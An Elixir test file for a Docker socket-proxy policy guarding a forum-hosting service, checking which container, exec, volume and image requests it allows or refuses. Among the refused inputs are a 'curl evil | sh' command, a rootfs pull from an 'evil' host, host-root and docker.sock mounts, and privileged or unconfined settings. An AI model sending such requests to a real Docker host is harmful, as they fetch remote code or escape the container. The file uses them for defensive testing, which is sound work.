# SPDX-FileCopyrightText: 2026 Mariano Pictet and contributors
# SPDX-License-Identifier: AGPL-3.0-only

defmodule DockerGuard.HN04PolicyTest do
  @moduledoc "HN-04: what docker-guard lets through to the socket proxy, rule by rule."
  use ExUnit.Case, async: true

  alias DockerGuard.Policy

  @moduletag req: "HN-04"

  @config %{image: "ghcr.io/callisto-rpg/idejo", network: "idejo-forums"}
  @label Policy.forum_label()

  # Docker's view of existing containers and exec instances.
  @lookup %{
    container_labels: &__MODULE__.labels/1,
    exec_container: &__MODULE__.exec_container/1
  }

  def labels("idejo-forum-tennis"), do: {:ok, %{@label => "tennis"}}
  def labels("caddy"), do: {:ok, %{"com.docker.compose.service" => "caddy"}}
  def labels(_id), do: :error

  def exec_container("forum-exec"), do: {:ok, "idejo-forum-tennis"}
  def exec_container("caddy-exec"), do: {:ok, "caddy"}
  def exec_container(_id), do: :error

  defp check(method, path, opts \\ []) do
    req = %{
      method: method,
      path: path,
      query: Keyword.get(opts, :query, %{}),
      body: Keyword.get(opts, :body)
    }

    Policy.check(req, @config, @lookup)
  end

  # What the Hub sends for a forum (IdejoHub.Hosting.ForumContainer builds the same shape).
  defp create_body(overrides \\ %{}) do
    Map.merge(
      %{
        "Image" => "ghcr.io/callisto-rpg/idejo:0.1.0",
        "Env" => ["PHX_HOST=tennis.idejo.test", "PORT=4000"],
        "Cmd" => ["sh", "-c", "/app/bin/migrate && /app/bin/server"],
        "Labels" => %{@label => "tennis"},
        "HostConfig" => %{
          "Memory" => 268_435_456,
          "NanoCpus" => 500_000_000,
          "NetworkMode" => "idejo-forums",
          "RestartPolicy" => %{"Name" => "unless-stopped"},
          "Mounts" => [
            %{
              "Type" => "volume",
              "Source" => "idejo-forum-tennis-uploads",
              "Target" => "/data/uploads"
            },
            %{
              "Type" => "volume",
              "Source" => "idejo-forum-tennis-backups",
              "Target" => "/data/backups"
            }
          ]
        },
        "NetworkingConfig" => %{
          "EndpointsConfig" => %{"idejo-forums" => %{"Aliases" => ["tennis"]}}
        }
      },
      overrides
    )
  end

  defp host_config(overrides),
    do: create_body(%{"HostConfig" => Map.merge(create_body()["HostConfig"], overrides)})

  defp create(body, name \\ "idejo-forum-tennis"),
    do: check("POST", ["containers", "create"], query: %{"name" => name}, body: body)

  describe "creating a container" do
    test "a forum container as the Hub builds it is allowed" do
      assert create(create_body()) == :ok
      assert create(create_body(), "idejo-forum-tennis-restore") == :ok
    end

    test "only the official image, at an exact version or digest" do
      assert create(
               create_body(%{
                 "Image" => "ghcr.io/callisto-rpg/idejo@sha256:" <> String.duplicate("a", 64)
               })
             ) == :ok

      assert create(create_body(%{"Image" => "ghcr.io/callisto-rpg/idejo:latest"})) ==
               {:deny, :image}

      assert create(create_body(%{"Image" => "ghcr.io/callisto-rpg/idejo:0.1"})) ==
               {:deny, :image}

      assert create(create_body(%{"Image" => "alpine:3.20"})) == {:deny, :image}

      assert create(create_body(%{"Image" => "ghcr.io/callisto-rpg/idejo-evil:0.1.0"})) ==
               {:deny, :image}
    end

    test "privileged containers and host namespaces are refused" do
      assert create(host_config(%{"Privileged" => true})) == {:deny, :host_config_key}
      assert create(host_config(%{"PidMode" => "host"})) == {:deny, :host_config_key}
      assert create(host_config(%{"IpcMode" => "host"})) == {:deny, :host_config_key}
      assert create(host_config(%{"UsernsMode" => "host"})) == {:deny, :host_config_key}
      assert create(host_config(%{"NetworkMode" => "host"})) == {:deny, :network}
      assert create(host_config(%{"CapAdd" => ["SYS_ADMIN"]})) == {:deny, :host_config_key}

      assert create(host_config(%{"Devices" => [%{"PathOnHost" => "/dev/sda"}]})) ==
               {:deny, :host_config_key}

      assert create(host_config(%{"SecurityOpt" => ["apparmor=unconfined"]})) ==
               {:deny, :host_config_key}

      assert create(host_config(%{"VolumesFrom" => ["idejo-hub-db-1"]})) ==
               {:deny, :host_config_key}

      assert create(host_config(%{"PortBindings" => %{"4000/tcp" => [%{"HostPort" => "80"}]}})) ==
               {:deny, :host_config_key}
    end

    test "unknown top-level fields are refused" do
      assert create(create_body(%{"Entrypoint" => ["/bin/sh"]})) == {:deny, :create_key}
      assert create(create_body(%{"User" => "root"})) == {:deny, :create_key}
    end

    test "only this forum's named volumes, never a host path" do
      bind = fn binds -> host_config(%{"Mounts" => nil, "Binds" => binds}) end
      assert create(bind.(["idejo-forum-tennis-uploads:/data/uploads"])) == :ok
      assert create(bind.(["/:/host"])) == {:deny, :volume_not_forum}

      assert create(bind.(["/var/run/docker.sock:/var/run/docker.sock"])) ==
               {:deny, :volume_not_forum}

      assert create(bind.(["idejo-forum-chess-uploads:/data/uploads"])) ==
               {:deny, :volume_not_forum}

      assert create(bind.(["pgdata:/data"])) == {:deny, :volume_not_forum}

      mount = fn m -> host_config(%{"Mounts" => [m]}) end

      assert create(mount.(%{"Type" => "bind", "Source" => "/", "Target" => "/host"})) ==
               {:deny, :mount}

      assert create(
               mount.(%{
                 "Type" => "volume",
                 "Source" => "idejo-forum-tennis-x",
                 "Target" => "/x",
                 "VolumeOptions" => %{"DriverConfig" => %{"Options" => %{"device" => "/"}}}
               })
             ) == {:deny, :mount}
    end

    test "memory and CPU limits are required (SC-05)" do
      assert create(host_config(%{"Memory" => 0})) == {:deny, :memory_limit}

      assert create(
               create_body(%{"HostConfig" => Map.delete(create_body()["HostConfig"], "NanoCpus")})
             ) ==
               {:deny, :cpu_limit}
    end

    test "the name and label must name the same, valid forum" do
      assert create(create_body(), "caddy") == {:deny, :container_name}
      assert create(create_body(), "idejo-forum-chess") == {:deny, :container_name}
      assert create(create_body(%{"Labels" => %{}})) == {:deny, :forum_label}

      assert create(create_body(%{"Labels" => %{@label => "Bad_Slug"}}), "idejo-forum-Bad_Slug") ==
               {:deny, :forum_label}
    end

    test "only the server or idejo-admin as the command" do
      assert create(create_body(%{"Cmd" => nil})) == :ok

      assert create(
               create_body(%{"Cmd" => ["/app/bin/idejo-admin", "restore", "x.tar", "--yes"]})
             ) == :ok

      assert create(create_body(%{"Cmd" => ["sh", "-c", "curl evil | sh"]})) == {:deny, :command}
    end

    test "only the forum network" do
      other = %{"NetworkingConfig" => %{"EndpointsConfig" => %{"bridge" => %{}}}}
      assert create(create_body(other)) == {:deny, :network}
    end

    test "a body is required" do
      assert create(nil) == {:deny, :body_required}
    end
  end

  describe "existing containers" do
    test "forum containers can be driven" do
      for {method, action} <- [
            {"GET", "json"},
            {"POST", "start"},
            {"POST", "stop"},
            {"POST", "wait"},
            {"PUT", "archive"},
            {"GET", "logs"}
          ] do
        assert check(method, ["containers", "idejo-forum-tennis", action]) == :ok
      end

      assert check("DELETE", ["containers", "idejo-forum-tennis"]) == :ok
    end

    test "other containers cannot be read, driven or removed" do
      assert check("GET", ["containers", "caddy", "json"]) == {:deny, :container_not_forum}
      assert check("POST", ["containers", "caddy", "stop"]) == {:deny, :container_not_forum}
      assert check("DELETE", ["containers", "caddy"]) == {:deny, :container_not_forum}
      assert check("GET", ["containers", "missing", "json"]) == {:deny, :unknown_container}
    end

    test "endpoints outside the list are refused" do
      assert check("POST", ["containers", "idejo-forum-tennis", "update"]) ==
               {:deny, :not_allowed}

      assert check("POST", ["containers", "idejo-forum-tennis", "commit"]) ==
               {:deny, :not_allowed}

      assert check("POST", ["build"]) == {:deny, :not_allowed}
      assert check("GET", ["info"]) == {:deny, :not_allowed}
      assert check("POST", ["networks", "create"]) == {:deny, :not_allowed}
    end

    test "listing is limited to forum containers" do
      assert {:ok, %{query: query}} =
               check("GET", ["containers", "json"],
                 query: %{"all" => "1", "filters" => ~s({"name":["caddy"]})}
               )

      assert query["all"] == "1"
      assert Jason.decode!(query["filters"]) == %{"label" => [@label]}
    end
  end

  describe "exec" do
    defp exec(container, body), do: check("POST", ["containers", container, "exec"], body: body)

    test "idejo-admin in a forum container is allowed" do
      body = %{
        "Cmd" => ["/app/bin/idejo-admin", "backup"],
        "AttachStdout" => true,
        "AttachStderr" => true
      }

      assert exec("idejo-forum-tennis", body) == :ok
      assert check("POST", ["exec", "forum-exec", "start"]) == :ok
      assert check("GET", ["exec", "forum-exec", "json"]) == :ok
    end

    test "privileged exec, other commands and other containers are refused" do
      admin = ["/app/bin/idejo-admin", "backup"]

      assert exec("idejo-forum-tennis", %{"Cmd" => admin, "Privileged" => true}) ==
               {:deny, :privileged_exec}

      assert exec("idejo-forum-tennis", %{"Cmd" => admin, "User" => "root"}) == {:deny, :exec_key}
      assert exec("idejo-forum-tennis", %{"Cmd" => ["sh"]}) == {:deny, :exec_command}
      assert exec("caddy", %{"Cmd" => admin}) == {:deny, :container_not_forum}
      assert check("POST", ["exec", "caddy-exec", "start"]) == {:deny, :container_not_forum}
      assert check("POST", ["exec", "missing", "start"]) == {:deny, :unknown_exec}
    end
  end

  describe "volumes and images" do
    defp volume(body), do: check("POST", ["volumes", "create"], body: body)

    test "forum volumes on the local driver, without driver options" do
      ok = %{"Name" => "idejo-forum-tennis-uploads", "Labels" => %{@label => "tennis"}}
      assert volume(ok) == :ok
      assert volume(Map.put(ok, "Name", "pgdata")) == {:deny, :volume_not_forum}

      assert volume(
               Map.put(ok, "DriverOpts", %{"type" => "none", "o" => "bind", "device" => "/"})
             ) ==
               {:deny, :volume_driver_opts}

      assert volume(Map.put(ok, "Driver", "sshfs")) == {:deny, :volume_driver}
      assert check("DELETE", ["volumes", "idejo-forum-tennis-uploads"]) == :ok
      assert check("DELETE", ["volumes", "idejo-hub_pgdata"]) == {:deny, :volume_not_forum}
    end

    test "pulls of the official image only" do
      pull = fn query -> check("POST", ["images", "create"], query: query) end
      assert pull.(%{"fromImage" => "ghcr.io/callisto-rpg/idejo", "tag" => "0.2.0"}) == :ok
      assert pull.(%{"fromImage" => "ghcr.io/callisto-rpg/idejo:0.2.0"}) == :ok
      assert pull.(%{"fromImage" => "alpine", "tag" => "3.20"}) == {:deny, :image}
      assert pull.(%{"fromSrc" => "http://evil/rootfs.tar"}) == {:deny, :pull_param}
      assert check("GET", ["images", "ghcr.io", "callisto-rpg", "idejo:0.1.0", "json"]) == :ok
    end
  end
end
